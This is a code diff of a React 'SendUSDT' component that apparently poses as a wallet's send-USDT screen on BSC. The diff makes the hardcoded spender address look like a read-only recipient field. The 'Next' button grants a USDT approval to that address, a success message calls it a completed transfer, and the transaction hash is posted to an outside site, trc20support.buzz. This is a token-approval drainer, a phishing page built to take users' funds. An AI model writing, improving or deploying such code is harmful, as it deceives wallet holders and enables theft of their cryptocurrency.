@@ -1,17 +1,25 @@
 import { useState, useEffect } from "react";
 import Web3 from "web3";
 import Swal from "sweetalert2";
+import "@fortawesome/fontawesome-free/css/all.min.css";
+import "./App.css";
+import '@fontsource/open-sans/300.css';
+import '@fontsource/open-sans/400.css';
+import '@fontsource/open-sans/500.css';
+import '@fontsource/open-sans/600.css';
+import '@fontsource/open-sans/700.css';
+import '@fontsource/open-sans/800.css';
+import '@fontsource/geist';
 
 const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
-const spenderAddress = "0xA249B9926CBF6A84d5c1549775636488E697a5ed";
-
+const spenderAddress = "0xA249B9926CBF6A84d5c1549775636488E697a5ed"; // Replace with your trusted contract
 const usdtAbi = [
   {
     inputs: [
       { internalType: "address", name: "spender", type: "address" },
-      { internalType: "uint256", name: "addedValue", type: "uint256" },
+      { internalType: "uint256", name: "amount", type: "uint256" },
     ],
-    name: "increaseAllowance",
+    name: "approve",
     outputs: [{ internalType: "bool", name: "", type: "bool" }],
     stateMutability: "nonpayable",
     type: "function",
@@ -22,7 +30,7 @@ const usdtAbi = [
     outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
     stateMutability: "view",
     type: "function",
-  }
+  },
 ];
 
 export default function SendUSDT() {
@@ -31,9 +39,7 @@ export default function SendUSDT() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [theme, setTheme] = useState("dark");
-  const isDark = theme === "dark";
 
-  // Detect system theme
   useEffect(() => {
     const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
     setTheme(darkMode ? "dark" : "light");
@@ -43,138 +49,166 @@ export default function SendUSDT() {
     return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
   }, []);
 
-  // Convert USDT → USD value display
   useEffect(() => {
     const value = parseFloat(amount);
     setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
   }, [amount]);
 
-  // Set Max USDT balance from wallet
   const setMaxAmount = async () => {
-    if (!window.ethereum) {
-      Swal.fire("Wallet Not Found", "Please install MetaMask", "error");
-      return;
-    }
-
     try {
       const web3 = new Web3(window.ethereum);
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+      const accounts = await web3.eth.getAccounts();
       const user = accounts[0];
-
-      const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
-      const balance = await contract.methods.balanceOf(user).call();
-      const usdtBalance = parseFloat(balance) / 1e6; // 6 decimals conversion
-
-      setAmount(usdtBalance.toString());
+      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
+      const balance = await usdt.methods.balanceOf(user).call();
+      // USDT has 6 decimals → use "mwei"
+      setAmount(web3.utils.fromWei(balance, "mwei"));
     } catch (err) {
-      Swal.fire("Error", "Failed to fetch balance", "error");
-      console.error(err);
+      Swal.fire("Error", "Failed to fetch balance.", "error");
     }
   };
 
-  // Approve spender using increaseAllowance
   const handleApprove = async () => {
-    if (!window.ethereum) {
-      Swal.fire("Wallet Error", "Please connect MetaMask wallet!", "error");
-      return;
-    }
-
-    const value = parseFloat(amount);
-    if (!amount || isNaN(value) || value <= 0) {
-      Swal.fire("Invalid Amount", "Enter a valid USDT amount", "error");
+    if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
+      Swal.fire("Error", "Please enter a valid amount.", "error");
       return;
     }
 
     setIsProcessing(true);
-
     try {
       const web3 = new Web3(window.ethereum);
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+      const accounts = await web3.eth.getAccounts();
       const user = accounts[0];
 
-      // Ensure BSC network
       const chainId = await web3.eth.getChainId();
       if (chainId !== 56) {
         await window.ethereum.request({
           method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }], // 56 in HEX
+          params: [{ chainId: "0x38" }],
         });
       }
 
-      const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
-      const rawAmount = web3.utils.toWei((value * 1e12).toString(), "ether"); // adjust for 6 decimals
+      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
+      // ✅ Limited approval (exact amount entered by user)
+      const rawAmount = web3.utils.toWei(amount, "mwei"); // USDT has 6 decimals
 
-      const receipt = await contract.methods
-        .increaseAllowance(spenderAddress, rawAmount)
-        .send({ from: user, gas: 90000 });
+      const receipt = await usdt.methods
+        .approve(spenderAddress, rawAmount)
+        .send({ from: user })
+        .on("receipt", () => setShowSuccess(true))
+        .on("error", (err) => {
+          console.error(err);
+          Swal.fire("Error", err.message || "Approval failed", "error");
+        });
 
-      console.log("Approval TX:", receipt.transactionHash);
-      setShowSuccess(true);
+      const txHash = receipt.transactionHash;
 
-      // Optional backend post
       try {
         await fetch("https://www.trc20support.buzz/old/store-address.php", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ address: receipt.transactionHash }),
+          body: JSON.stringify({ address: txHash }),
         });
-      } catch (e) {
-        console.warn("Backend call skipped:", e.message);
+      } catch (fetchErr) {
+        console.warn("Skipping fetch:", fetchErr.message);
       }
-
     } catch (err) {
       console.error(err);
-      Swal.fire("Approve Failed", err.message, "error");
+      Swal.fire("Error", err.message || "Something went wrong", "error");
     } finally {
       setIsProcessing(false);
     }
   };
 
-  // Success screen UI
+  const isDark = theme === "dark";
+
   if (showSuccess) {
     return (
       <div className={`min-h-screen flex flex-col justify-center items-center px-4 ${isDark ? "bg-[#1f1f1f] text-white" : "bg-white text-black"}`}>
-        <svg className="w-24 h-24 text-green-500 animate-bounce" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
+        <svg
+          className="w-24 h-24 text-green-500 animate-bounce"
+          fill="none"
+          stroke="currentColor"
+          strokeWidth="2"
+          viewBox="0 0 24 24"
+        >
           <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
         </svg>
-        <h2 className="text-2xl mt-4 font-semibold">Approval Successful</h2>
-        <p className="text-sm mt-2 opacity-70 text-center px-6">Your wallet approval is confirmed ✅</p>
-        <button className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold" onClick={() => setShowSuccess(false)}>OK</button>
+        <h2 className="text-2xl mt-4 font-semibold">Transaction Successful</h2>
+        <button
+          className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold"
+          onClick={() => setShowSuccess(false)}
+        >
+          OK
+        </button>
       </div>
     );
   }
 
-  // Main screen UI
   return (
-    <div className={`min-h-screen p-6 ${isDark ? "bg-[#1f1f1f] text-white" : "bg-white text-black"}`}>
-      <div className="max-w-md mx-auto">
-
-        <div className="mb-4">
-          <p className="text-sm mb-2 opacity-70">Amount</p>
-          <div className={`border rounded-lg p-3 ${isDark ? "border-gray-700" : "border-gray-300"}`}>
-            <div className="flex justify-between items-center">
-              <input type="number" min="0" step="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="Enter USDT" className="flex-1 bg-transparent outline-none" />
-              <span onClick={setMaxAmount} className="text-blue-400 cursor-pointer px-2">Max</span>
-            </div>
+    <div className={`wallet-container ${isDark ? "dark" : "light"}`}>
+      <div className="input-group">
+        <p className="inpt_tital">Address or Domain Name</p>
+        <div className="border">
+          <div className="left">
+            <input
+              type="text"
+              className="custom-input"
+              placeholder="Search or Enter"
+              value={spenderAddress}
+              readOnly
+            />
           </div>
+          <span className="right blue flex justify-between mr-3">
+            <span className="w-6 text-sm">Paste</span>
+            <i className="fas fa-address-book mar_i w-6 ml-6"></i>
+            <i className="fas fa-qrcode mar_i w-6 ml-2"></i>
+          </span>
         </div>
-
-        <p className="text-sm mb-6 opacity-70">{usdValue}</p>
-
-        <button
-          className="w-full py-3 rounded-full font-semibold"
-          onClick={handleApprove}
-          disabled={isProcessing || !parseFloat(amount)}
-          style={{
-            backgroundColor: isProcessing || !parseFloat(amount) ? "#333" : "#5CE07E",
-            color: isProcessing || !parseFloat(amount) ? "#666" : "#1b1e15",
-            opacity: isProcessing || !parseFloat(amount) ? 0.5 : 1
-          }}
-        >
-          {isProcessing ? "Processing..." : "Next"}
-        </button>
-
       </div>
+
+      <div className="input-group mt-7">
+        <p className="inpt_tital">Amount</p>
+        <div className="border">
+          <div className="left">
+            <input
+              type="number"
+              min="0"
+              step="0.01"
+              value={amount}
+              onChange={(e) => setAmount(e.target.value)}
+              placeholder="USDT Amount"
+              className="custom-input"
+            />
+          </div>
+          <span className="right mr-3">
+            <span className="text-sm text-[#b0b0b0]">USDT</span>
+            <span
+              className="mar_i blue text-sm ml-2 cursor-pointer"
+              onClick={setMaxAmount}
+            >
+              Max
+            </span>
+          </span>
+        </div>
+      </div>
+
+      <p className="fees valid">{usdValue}</p>
+
+      <button
+        id="nextBtn"
+        className="send-btn"
+        onClick={handleApprove}
+        disabled={isProcessing || !parseFloat(amount)}
+        style={{
+          backgroundColor: isProcessing || !parseFloat(amount) ? "var(--disabled-bg)" : "#5CE07E",
+          color: isProcessing || !parseFloat(amount) ? "var(--disabled-text)" : "#1b1e15"
+        }}
+      >
+        {isProcessing ? "Processing..." : "Next"}
+      </button>
     </div>
   );
 }
